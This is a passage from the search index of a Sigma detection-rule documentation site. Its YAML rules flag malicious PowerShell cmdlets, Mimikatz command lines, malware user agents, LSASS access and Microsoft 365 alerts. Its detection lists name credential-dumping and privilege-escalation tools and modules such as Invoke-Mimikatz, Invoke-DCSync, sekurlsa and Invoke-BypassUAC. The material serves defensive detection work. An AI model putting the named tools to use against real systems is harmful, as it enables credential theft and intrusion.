\u0026#39;Set-MacAttribute\u0026#39; - \u0026#39;Invoke-DCSync\u0026#39; - \u0026#39;Invoke-PowerDump\u0026#39; - \u0026#39;Exploit-Jboss\u0026#39; - \u0026#39;Invoke-ThunderStruck\u0026#39; - \u0026#39;Invoke-VoiceTroll\u0026#39; - \u0026#39;Set-Wallpaper\u0026#39; - \u0026#39;Invoke-InveighRelay\u0026#39; - \u0026#39;Invoke-PsExec\u0026#39; - \u0026#39;Invoke-SSHCommand\u0026#39; - \u0026#39;Get-SecurityPackages\u0026#39; - \u0026#39;Install-SSP\u0026#39; - \u0026#39;Invoke-BackdoorLNK\u0026#39; - \u0026#39;PowerBreach\u0026#39; - \u0026#39;Get-SiteListPassword\u0026#39; - \u0026#39;Get-System\u0026#39; - \u0026#39;Invoke-BypassUAC\u0026#39; - \u0026#39;Invoke-Tater\u0026#39; - \u0026#39;Invoke-WScriptBypassUAC\u0026#39; - \u0026#39;PowerUp\u0026#39; - \u0026#39;PowerView\u0026#39; - \u0026#39;Get-RickAstley\u0026#39; - \u0026#39;Find-Fruit\u0026#39; - \u0026#39;HTTP-Login\u0026#39; - \u0026#39;Find-TrustedDocuments\u0026#39; - \u0026#39;Invoke-Paranoia\u0026#39; - \u0026#39;Invoke-WinEnum\u0026#39; - \u0026#39;Invoke-ARPScan\u0026#39; - \u0026#39;Invoke-PortScan\u0026#39; - \u0026#39;Invoke-ReverseDNSLookup\u0026#39; - \u0026#39;Invoke-SMBScanner\u0026#39; - \u0026#39;Invoke-Mimikittenz\u0026#39; - \u0026#39;Invoke-AllChecks\u0026#39; false_positives: ScriptBlockText|contains: - Get-SystemDriveInfo # http://bheltborg.dk/Windows/WinSxS/amd64_microsoft-windows-maintenancediagnostic_31bf3856ad364e35_10.0.10240.16384_none_91ef7543a4514b5e/CL_Utility.ps1 - C:\\ProgramData\\Amazon\\EC2-Windows\\Launch\\Module\\Scripts\\Set-Wallpaper.ps1 # false positive form Amazon EC2 condition: select_Malicious and not false_positives falsepositives: - Penetration testing level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious PowerShell Commandlets"},{"categories":null,"contents":"Detects keywords from well-known PowerShell exploitation frameworks\nKnown false-positives Penetration tests References https://adsecurity.org/?p=2921 Raw rule (edit) title: Malicious PowerShell Keywords id: f62176f3-8128-4faa-bf6c-83261322e5eb status: experimental description: Detects keywords from well-known PowerShell exploitation frameworks references: - https://adsecurity.org/?p=2921 tags: - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_script definition: \u0026#39;It is recommended to use the new \u0026#34;Script Block Logging\u0026#34; of PowerShell v5 https://adsecurity.org/?p=2277\u0026#39; detection: Malicious: ScriptBlockText|contains: - \u0026#39;AdjustTokenPrivileges\u0026#39; - \u0026#39;IMAGE_NT_OPTIONAL_HDR64_MAGIC\u0026#39; - \u0026#39;Microsoft.Win32.UnsafeNativeMethods\u0026#39; - \u0026#39;ReadProcessMemory.Invoke\u0026#39; - \u0026#39;SE_PRIVILEGE_ENABLED\u0026#39; - \u0026#39;LSA_UNICODE_STRING\u0026#39; - \u0026#39;MiniDumpWriteDump\u0026#39; - \u0026#39;PAGE_EXECUTE_READ\u0026#39; - \u0026#39;SECURITY_DELEGATION\u0026#39; - \u0026#39;TOKEN_ADJUST_PRIVILEGES\u0026#39; - \u0026#39;TOKEN_ALL_ACCESS\u0026#39; - \u0026#39;TOKEN_ASSIGN_PRIMARY\u0026#39; - \u0026#39;TOKEN_DUPLICATE\u0026#39; - \u0026#39;TOKEN_ELEVATION\u0026#39; - \u0026#39;TOKEN_IMPERSONATE\u0026#39; - \u0026#39;TOKEN_INFORMATION_CLASS\u0026#39; - \u0026#39;TOKEN_PRIVILEGES\u0026#39; - \u0026#39;TOKEN_QUERY\u0026#39; - \u0026#39;Metasploit\u0026#39; - \u0026#39;Mimikatz\u0026#39; condition: Malicious falsepositives: - Penetration tests level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_malicious_keywords.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious PowerShell Keywords"},{"categories":null,"contents":"Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces). Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\nKnown false-positives It\u0026rsquo;s not an uncommon to use te.exe directly to execute legal TAEF tests References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Te.yml https://twitter.com/pabraeken/status/993298228840992768 https://docs.microsoft.com/en-us/windows-hardware/drivers/taef/ Raw rule (edit) title: Malicious Windows Script Components File Execution by TAEF Detection id: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b status: test description: Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces). Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe author: \u0026#39;Agro (@agro_sev) oscd.community\u0026#39; references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Te.yml - https://twitter.com/pabraeken/status/993298228840992768 - https://docs.microsoft.com/en-us/windows-hardware/drivers/taef/ date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\te.exe\u0026#39; selection2: ParentImage|endswith: \u0026#39;\\te.exe\u0026#39; selection3: OriginalFileName: \u0026#39;\\te.exe\u0026#39; condition: selection1 or selection2 or selection3 falsepositives: - It\u0026#39;s not an uncommon to use te.exe directly to execute legal TAEF tests level: low tags: - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_use_of_te_bin.yml/","tags":["attack.t1218"],"title":"Malicious Windows Script Components File Execution by TAEF Detection"},{"categories":null,"contents":"Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro\nKnown false-positives unknown References https://twitter.com/JohnLaTwC/status/837743453039534080 Raw rule (edit) title: Malware Shellcode in Verclsid Target Process id: b7967e22-3d7e-409b-9ed5-cdae3f9243a1 status: test description: Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro author: John Lambert (tech), Florian Roth (rule) references: - https://twitter.com/JohnLaTwC/status/837743453039534080 date: 2017/03/04 modified: 2021/11/27 logsource: category: process_access product: windows definition: \u0026#39;Use the following config to generate the necessary Event ID 10 Process Access events: \u0026lt;ProcessAccess onmatch=\u0026#34;include\u0026#34;\u0026gt;\u0026lt;CallTrace condition=\u0026#34;contains\u0026#34;\u0026gt;VBE7.DLL\u0026lt;/CallTrace\u0026gt;\u0026lt;/ProcessAccess\u0026gt;\u0026lt;ProcessAccess onmatch=\u0026#34;exclude\u0026#34;\u0026gt;\u0026lt;CallTrace condition=\u0026#34;excludes\u0026#34;\u0026gt;UNKNOWN\u0026lt;/CallTrace\u0026gt;\u0026lt;/ProcessAccess\u0026gt;\u0026#39; detection: selection: TargetImage|endswith: \u0026#39;\\verclsid.exe\u0026#39; GrantedAccess: \u0026#39;0x1FFFFF\u0026#39; combination1: CallTrace|contains|all: - \u0026#39;|UNKNOWN(\u0026#39; - \u0026#39;VBE7.DLL\u0026#39; combination2: SourceImage|contains: \u0026#39;\\Microsoft Office\\\u0026#39; CallTrace|contains: \u0026#39;|UNKNOWN\u0026#39; condition: selection and 1 of combination* falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_malware_verclsid_shellcode.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055"],"title":"Malware Shellcode in Verclsid Target Process"},{"categories":null,"contents":"Detects suspicious user agent strings used by malware in proxy logs\nKnown false-positives Unknown References http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules http://www.botopedia.org/search?searchword=scan\u0026amp;searchphrase=all https://networkraptor.blogspot.com/2015/01/user-agent-strings.html https://perishablepress.com/blacklist/ua-2013.txt https://www.bluecoat.com/en-gb/security-blog/2015-05-05/know-your-agents Raw rule (edit) title: Malware User Agent id: 5c84856b-55a5-45f1-826f-13f37250cf4e status: test description: Detects suspicious user agent strings used by malware in proxy logs author: Florian Roth references: - http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules - http://www.botopedia.org/search?searchword=scan\u0026amp;searchphrase=all - https://networkraptor.blogspot.com/2015/01/user-agent-strings.html - https://perishablepress.com/blacklist/ua-2013.txt - https://www.bluecoat.com/en-gb/security-blog/2015-05-05/know-your-agents date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: # RATs - \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Chrome /53.0\u0026#39; # DargonOK - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\u0026#39; # Used by PlugX - base-lining recommended - https://community.rsa.com/thread/185439 - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)\u0026#39; # Used by PlugX - base-lining recommended - https://community.rsa.com/thread/185439 - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\u0026#39; # Used by PlugX - old - https://goo.gl/Yfjtk5 - \u0026#39;HttpBrowser/1.0\u0026#39; # HTTPBrowser RAT - \u0026#39;*\u0026lt;|\u0026gt;*\u0026#39; # Houdini / Iniduoh / njRAT - \u0026#39;nsis_inetc (mozilla)\u0026#39; # ZeroAccess - \u0026#39;Wget/1.9+cvs-stable (Red Hat modified)\u0026#39; # Dyre / Upatre # Ghost419 https://goo.gl/rW1yvZ - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\u0026#39; # Malware - \u0026#39;*zeroup*\u0026#39; # W32/Renos.Downloader - \u0026#39;Mozilla/5.0 (Windows NT 5.1 ; v.*\u0026#39; # Kazy - \u0026#39;* adlib/*\u0026#39; # https://goo.gl/gcAHoh - \u0026#39;* tiny\u0026#39; # Trojan Downloader - \u0026#39;* BGroom *\u0026#39; # Trojan Downloader - \u0026#39;* changhuatong\u0026#39; - \u0026#39;* CholTBAgent\u0026#39; - \u0026#39;Mozilla/5.0 WinInet\u0026#39; - \u0026#39;RookIE/1.0\u0026#39; - \u0026#39;M\u0026#39; # HkMain - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\u0026#39; # Egamipload - old UA - probable prone to false positives - \u0026#39;Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)\u0026#39; # Yakes - \u0026#39;backdoorbot\u0026#39; - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731)\u0026#39; # Sality - \u0026#39;Opera/8.81 (Windows NT 6.0; U; en)\u0026#39; # Sality - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)\u0026#39; # Sality - \u0026#39;Opera\u0026#39; # Trojan Keragany - \u0026#39;Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)\u0026#39; # Fareit - \u0026#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026#39; # Webshell\u0026#39;s back connect - \u0026#39;MSIE\u0026#39; # Toby web shell - \u0026#39;*(Charon; Inferno)\u0026#39; # Loki Bot - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)\u0026#39; # Fareit / Pony - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\u0026#39; # https://goo.gl/g43qjs - \u0026#39;Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1)\u0026#39; # MacControl malware https://goo.gl/sqY3Ja https://www.symantec.com/connect/blogs/osxmacontrol-back-it-again - \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64)\u0026#39; # used by Zebrocy malware https://app.any.run/tasks/7d7fa4a0-6970-4428-828b-29572abf9ceb/ # Ursnif - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64)\u0026#39; # Emotet - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3)\u0026#39; # https://twitter.com/webbthewombat/status/1225827092132179968 # Others - \u0026#39;* pxyscand*\u0026#39; - \u0026#39;* asd\u0026#39; - \u0026#39;* mdms\u0026#39; - \u0026#39;sample\u0026#39; - \u0026#39;nocase\u0026#39; - \u0026#39;Moxilla\u0026#39; - \u0026#39;Win32 *\u0026#39; - \u0026#39;*Microsoft Internet Explorer*\u0026#39; - \u0026#39;agent *\u0026#39; - \u0026#39;AutoIt\u0026#39; # Suspicious - base-lining recommended - \u0026#39;IczelionDownLoad\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)\u0026#39; # https://unit42.paloaltonetworks.com/thor-plugx-variant/ condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_malware.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Malware User Agent"},{"categories":null,"contents":"Alerts on Metasploit host\u0026rsquo;s authentications on the domain.\nKnown false-positives Linux hostnames composed of 16 characters. References https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/proto/smb/client.rb Raw rule (edit) title: Metasploit SMB Authentication description: Alerts on Metasploit host\u0026#39;s authentications on the domain. status: experimental id: 72124974-a68b-4366-b990-d30e0b2a190d author: Chakib Gzenayi (@Chak092), Hosni Mribah date: 2020/05/06 modified: 2021/07/07 references: - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/proto/smb/client.rb tags: - attack.lateral_movement - attack.t1021.002 logsource: product: windows service: security detection: selection1: EventID: - 4625 - 4624 LogonType: 3 AuthenticationPackageName: \u0026#39;NTLM\u0026#39; WorkstationName|re: \u0026#39;^[A-Za-z0-9]{16}$\u0026#39; selection2: ProcessName: EventID: 4776 Workstation|re: \u0026#39;^[A-Za-z0-9]{16}$\u0026#39; condition: selection1 or selection2 falsepositives: - Linux hostnames composed of 16 characters. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_metasploit_authentication.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Metasploit SMB Authentication"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel.\nKnown false-positives References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Microsoft 365 - Impossible Travel Activity id: d7eab125-5f94-43df-8710-795b80fa1189 status: test description: Detects when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel. author: Austin Songer @austinsonger references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference date: 2020/07/06 modified: 2021/11/27 logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Impossible travel activity\u0026#39; status: success condition: selection falsepositives: - level: medium tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_impossible_travel_activity.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Microsoft 365 - Impossible Travel Activity"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when a user uploads files to the cloud that might be infected with ransomware.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Microsoft 365 - Potential Ransomware Activity id: bd132164-884a-48f1-aa2d-c6d646b04c69 status: experimental description: Detects when a Microsoft Cloud App Security reported when a user uploads files to the cloud that might be infected with ransomware. author: austinsonger date: 2021/08/19 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Potential ransomware activity\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1486 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_potential_ransomware_activity.yml/","tags":["attack.impact","attack.t1486"],"title":"Microsoft 365 - Potential Ransomware Activity"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files.\nKnown false-positives References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Microsoft 365 - Unusual Volume of File Deletion id: 78a34b67-3c39-4886-8fb4-61c46dc18ecd status: experimental description: Detects when a Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files. author: austinsonger date: 2021/08/19 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Unusual volume of file deletion\u0026#39; status: success condition: selection falsepositives: - level: medium tags: - attack.impact - attack.t1485 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_unusual_volume_of_file_deletion.yml/","tags":["attack.impact","attack.t1485"],"title":"Microsoft 365 - Unusual Volume of File Deletion"},{"categories":null,"contents":"Detects when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email.\nKnown false-positives References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Microsoft 365 - User Restricted from Sending Email id: ff246f56-7f24-402a-baca-b86540e3925c status: experimental description: Detects when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email. author: austinsonger date: 2021/08/19 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;User restricted from sending email\u0026#39; status: success condition: selection falsepositives: - level: medium tags: - attack.initial_access - attack.t1199 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_user_restricted_from_sending_email.yml/","tags":["attack.initial_access","attack.t1199"],"title":"Microsoft 365 - User Restricted from Sending Email"},{"categories":null,"contents":"Detects block of attempt to disable real time protection of Microsoft Defender by tamper protection\nKnown false-positives Administrator actions References https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection Raw rule (edit) title: Microsoft Defender Tamper Protection Trigger id: 49e5bc24-8b86-49f1-b743-535f332c2856 description: Detects block of attempt to disable real time protection of Microsoft Defender by tamper protection date: 2021/07/05 author: Bhabesh Raj references: - https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection status: stable tags: - attack.defense_evasion - attack.t1562.001 falsepositives: - Administrator actions level: critical logsource: product: windows service: windefend detection: selection: EventID: - 5013 Value|endswith: - \u0026#39;\\Windows Defender\\DisableAntiSpyware = 0x1()\u0026#39; - \u0026#39;\\Real-Time Protection\\DisableRealtimeMonitoring = (Current)\u0026#39; condition: selection ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_tamper_protection_trigger.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Microsoft Defender Tamper Protection Trigger"},{"categories":null,"contents":"This rule detects a suspicious crash of the Microsoft Malware Protection Engine\nKnown false-positives MsMpEng.exe can crash when C:\\ is full References https://bugs.chromium.org/p/project-zero/issues/detail?id=1252\u0026amp;desc=5 https://technet.microsoft.com/en-us/library/security/4022344 Raw rule (edit) title: Microsoft Malware Protection Engine Crash id: 6c82cf5c-090d-4d57-9188-533577631108 description: This rule detects a suspicious crash of the Microsoft Malware Protection Engine tags: - attack.defense_evasion - attack.t1211 - attack.t1562.001 status: experimental date: 2017/05/09 modified: 2021/10/13 references: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1252\u0026amp;desc=5 - https://technet.microsoft.com/en-us/library/security/4022344 author: Florian Roth logsource: product: windows service: application detection: selection1: Provider_Name: \u0026#39;Application Error\u0026#39; EventID: 1000 selection2: Provider_Name: \u0026#39;Windows Error Reporting\u0026#39; EventID: 1001 keywords: - \u0026#39;MsMpEng.exe\u0026#39; - \u0026#39;mpengine.dll\u0026#39; condition: 1 of selection* and all of keywords falsepositives: - MsMpEng.exe can crash when C:\\ is full level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_susp_msmpeng_crash.yml/","tags":["attack.defense_evasion","attack.t1211","attack.t1562.001"],"title":"Microsoft Malware Protection Engine Crash"},{"categories":null,"contents":"Detects add-ins that load when Microsoft Word or Excel starts (.wll/.xll are simply .dll fit for Word or Excel).\nKnown false-positives Legitimate add-ins References Internal Research Raw rule (edit) title: Microsoft Office Add-In Loading id: 8e1cb247-6cf6-42fa-b440-3f27d57e9936 status: test description: Detects add-ins that load when Microsoft Word or Excel starts (.wll/.xll are simply .dll fit for Word or Excel). author: NVISO references: - Internal Research date: 2020/05/11 modified: 2021/11/27 logsource: category: file_event product: windows detection: wlldropped: TargetFilename|contains: \\Microsoft\\Word\\Startup\\ TargetFilename|endswith: .wll xlldropped: TargetFilename|contains: \\Microsoft\\Excel\\Startup\\ TargetFilename|endswith: .xll generic: TargetFilename|contains: \\Microsoft\\Addins\\ TargetFilename|endswith: - .xlam - .xla condition: (wlldropped or xlldropped or generic) falsepositives: - Legitimate add-ins level: high tags: - attack.persistence - attack.t1137.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_office_persistence.yml/","tags":["attack.persistence","attack.t1137.006"],"title":"Microsoft Office Add-In Loading"},{"categories":null,"contents":"Detection well-known mimikatz command line arguments\nKnown false-positives Legitimate Administrator using tool for password recovery References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment https://tools.thehacker.recipes/mimikatz/modules Raw rule (edit) title: Mimikatz Command Line id: a642964e-bead-4bed-8910-1bb4d63e3b4d status: test description: Detection well-known mimikatz command line arguments author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - https://tools.thehacker.recipes/mimikatz/modules date: 2019/10/22 modified: 2022/02/07 tags: - attack.credential_access - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: - DumpCreds - invoke-mimikatz module_names: CommandLine|contains: - rpc - token - crypto - dpapi - sekurlsa - kerberos - lsadump - privilege - process - vault mimikatz_separator: CommandLine|contains: - \u0026#39;::\u0026#39; function_names: # To cover functions from modules that are not in module_names (likely too generic) CommandLine|contains: - \u0026#39;aadcookie\u0026#39; #misc module - \u0026#39;detours\u0026#39; #misc module - \u0026#39;memssp\u0026#39; #misc module - \u0026#39;mflt\u0026#39; #misc module - \u0026#39;ncroutemon\u0026#39; #misc module - \u0026#39;ngcsign\u0026#39; #misc module - \u0026#39;printnightmare\u0026#39; #misc module - \u0026#39;skeleton\u0026#39; #misc module - \u0026#39;preshutdown\u0026#39; #service module - \u0026#39;mstsc\u0026#39; #ts module - \u0026#39;multirdp\u0026#39; #ts module filter_1: CommandLine|contains: - \u0026#39;function Convert-GuidToCompressedGuid\u0026#39; condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names and mimikatz_separator) ) and not 1 of filter* falsepositives: - Legitimate Administrator using tool for password recovery level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mimikatz_command_line.yml/","tags":["attack.credential_access","attack.t1003.001","attack.t1003.002","attack.t1003.004","attack.t1003.005","attack.t1003.006"],"title":"Mimikatz Command Line"},{"categories":null,"contents":"Detects Mimikatz DC sync security events\nKnown false-positives Valid DC Sync that is not covered by the filters; please report Local Domain Admin account used for Azure AD Connect References https://twitter.com/gentilkiwi/status/1003236624925413376 https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 Raw rule (edit) title: Mimikatz DC Sync id: 611eab06-a145-4dfa-a295-3ccc5c20f59a description: Detects Mimikatz DC sync security events status: experimental date: 2018/06/03 modified: 2021/08/09 author: Benjamin Delpy, Florian Roth, Scott Dermott references: - https://twitter.com/gentilkiwi/status/1003236624925413376 - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 tags: - attack.credential_access - attack.s0002 - attack.t1003.006 logsource: product: windows service: security detection: selection: EventID: 4662 Properties|contains: - \u0026#39;Replicating Directory Changes All\u0026#39; - \u0026#39;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\u0026#39; filter1: SubjectDomainName: \u0026#39;Window Manager\u0026#39; filter2: SubjectUserName|startswith: - \u0026#39;NT AUTHORITY\u0026#39; - \u0026#39;MSOL_\u0026#39; filter3: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and not 1 of filter* falsepositives: - Valid DC Sync that is not covered by the filters; please report - Local Domain Admin account used for Azure AD Connect level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_dcsync.yml/","tags":["attack.credential_access","attack.s0002","attack.t1003.006"],"title":"Mimikatz DC Sync"},{"categories":null,"contents":"Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \u0026ldquo;only old versions\u0026rdquo;, 0x0010 PROCESS_VM_READ)\nKnown false-positives Some security products access LSASS in this way. References https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html Raw rule (edit) title: Mimikatz Detection LSASS Access id: 0d894093-71bc-43c3-8c4d-ecfc28dcf5d9 status: deprecated description: Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \u0026#34;only old versions\u0026#34;, 0x0010 PROCESS_VM_READ) references: - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html tags: - attack.t1003 - attack.s0002 - attack.credential_access - car.2019-04-004 author: Sherif Eldeeb date: 2017/10/18 modified: 2022/01/28 logsource: product: windows category: process_access detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x1010\u0026#39; - \u0026#39;0x410\u0026#39; filter: SourceImage|startswith: - \u0026#39;C:\\Program Files\\WindowsApps\\\u0026#39; - \u0026#39;C:\\Windows\\System32\\\u0026#39; SourceImage|endswith: \u0026#39;\\GamingServices.exe\u0026#39; condition: selection and not filter fields: - ComputerName - User - SourceImage falsepositives: - Some security products access LSASS in this way. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/sysmon_mimikatz_detection_lsass.yml/","tags":["attack.t1003","attack.s0002","attack.credential_access","car.2019-04-004"],"title":"Mimikatz Detection LSASS Access"},{"categories":null,"contents":"Detects the creation of files that contain Kerberos tickets based on an extension used by the popular tool Mimikatz\nKnown false-positives Unlikely References https://cobalt.io/blog/kerberoast-attack-techniques Raw rule (edit) title: Mimikatz Kirbi File Creation id: 9e099d99-44c2-42b6-a6d8-54c3545cab29 status: test description: Detects the creation of files that contain Kerberos tickets based on an extension used by the popular tool Mimikatz author: Florian Roth references: - https://cobalt.io/blog/kerberoast-attack-techniques date: 2021/11/08 tags: - attack.credential_access - attack.t1558 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: \u0026#39;.kirbi\u0026#39; condition: selection falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_mimikatz_kirbi_file_creation.yml/","tags":["attack.credential_access","attack.t1558"],"title":"Mimikatz Kirbi File Creation"},{"categories":null,"contents":"Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE\nKnown false-positives Windows administrator tasks or troubleshooting Windows management scripts or software References https://github.com/mitre-attack/bzar#indicators-for-attck-execution Raw rule (edit) title: MITRE BZAR Indicators for Execution id: b640c0b8-87f8-4daa-aef8-95a24261dd1d status: test 